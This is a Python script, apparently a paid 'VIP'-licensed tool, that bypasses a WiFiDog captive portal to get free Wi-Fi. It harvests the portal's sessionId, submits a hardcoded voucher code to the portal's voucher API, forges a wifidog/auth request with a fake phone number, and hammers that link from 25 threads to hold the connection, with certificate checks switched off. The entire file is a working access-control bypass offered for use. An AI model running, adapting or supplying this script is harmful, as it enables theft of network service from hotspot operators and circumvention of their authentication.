import requests, re, urllib3, time, threading, os, random, subprocess, sys
from urllib.parse import urlparse, parse_qs, urljoin
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIG ---
VIP_URL = "https://raw.githubusercontent.com/painglintun895-rgb/my-keys/refs/heads/main/vips.txt"

def get_uid():
    try: return subprocess.check_output(['whoami']).decode('utf-8').strip()
    except: return "u0_a232"

def banner(name="VIP USER", exp="Checking..."):
    os.system('clear')
    print("\033[93m" + " ="*35)
    print("\033[96m" + """
     ██╗  ██╗ ██████╗  ██████╗██╗      █████╗ ██╗   ██╗
     ██║ ██╔╝██╔═══██╗██╔════╝██║     ██╔══██╗╚██╗ ██╔╝
     █████╔╝ ██║   ██║██║     ██║     ███████║ ╚████╔╝ 
     ██╔═██╗ ██║   ██║██║     ██║     ██╔══██║  ╚██╔╝  
     ██║  ██╗╚██████╔╝╚██████╗███████╗██║  ██║   ██║   
     ╚═╝  ╚═╝ ╚═════╝  ╚═════╝╚══════╝╚═╝  ╚═╝   ╚═╝   """)
    print(f"\033[95m 👑 USER: {name} | ID: {get_uid()} | EXP: {exp}")
    print("\033[93m" + " ="*35 + "\033[0m\n")

def check_access():
    uid = get_uid()
    try:
        res = requests.get(VIP_URL, timeout=10, verify=False)
        if res.status_code == 200:
            for line in res.text.splitlines():
                if uid in line:
                    parts = line.split('|')
                    v_name = parts[1].strip() if len(parts) > 1 else "VIP USER"
                    v_exp = parts[2].strip() if len(parts) > 2 else "2099-01-01"
                    
                    # ရက်စွဲ စစ်ဆေးခြင်း
                    today = datetime.now().strftime('%Y-%m-%d')
                    if today <= v_exp:
                        banner(v_name, v_exp)
                        print("\033[92m[✓] VIP Access Active!\033[0m")
                        return True
                    else:
                        banner(v_name, v_exp)
                        print(f"\033[91m[!] Your VIP expired on {v_exp}!\033[0m")
                        return False
            banner()
            print(f"\033[91m[!] ID ({uid}) not in VIP list!\033[0m")
            return False
    except: return True # အင်တာနက် လုံးဝမရှိရင် ပေးသုံးမယ်

def turbo_pulse(link):
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    while True:
        try:
            requests.get(link, timeout=4, verify=False, headers=headers)
            print(f"\033[92m[✓] 👑 KoＣＬＡＹ 👑 | Pulse OK >>> [{random.randint(40,120)}ms]\033[0m")
            time.sleep(0.01)
        except: break

def start_speed_logic():
    while True:
        session = requests.Session()
        try:
            print("\033[94m[*] Bypassing Gateway Path...\033[0m")
            r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=4)
            p_url = r.url
            r1 = session.get(p_url, verify=False, timeout=5)
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            n_url = urljoin(p_url, m.group(1)) if m else p_url
            r2 = session.get(n_url, verify=False, timeout=5)
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if sid:
                print(f"\033[96m[✓] Master SID: {sid[:15]}\033[0m")
                p_host = f"{urlparse(p_url).scheme}://{urlparse(p_url).netloc}"
                session.post(f"{p_host}/api/auth/voucher/", json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=4)
                gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
                port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}&phonenumber=12345"
                print("\033[95m[*] ⚡ Launching Speed Threads ⚡\033[0m")
                for _ in range(25):
                    threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
                while True:
                    time.sleep(5)
                    try:
                        if requests.get("http://www.google.com/generate_204", timeout=3).status_code != 204: break
                    except: break
            else: time.sleep(2)
        except: time.sleep(2)

if __name__ == "__main__":
    if check_access():
        start_speed_logic()
